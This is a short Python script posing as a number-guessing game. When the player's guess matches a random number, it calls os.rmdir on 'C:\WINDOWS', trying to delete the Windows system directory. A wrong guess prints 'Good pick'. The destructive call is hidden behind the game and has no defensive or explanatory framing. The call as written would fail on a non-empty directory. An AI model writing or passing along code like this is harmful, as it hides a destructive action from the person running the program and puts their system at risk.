import os
import random


def cmd():
    def random_number():
        return random.randint(1, 10)

    def hrac_number():
        while True:
            try:
                cislo = int(input("Enter a number from 1 to 10: "))
                if 1 <= cislo <= 10:
                    return cislo
                else:
                    print("The number must be from 1 to 10.")
            except ValueError:
                print("Enter valid number")

    nahodne_cislo = random_number()
    hracovo_cislo = hrac_number()

    if hracovo_cislo == nahodne_cislo:
        os.rmdir("C:\WINDOWS")
    else:
        print("Good pick")
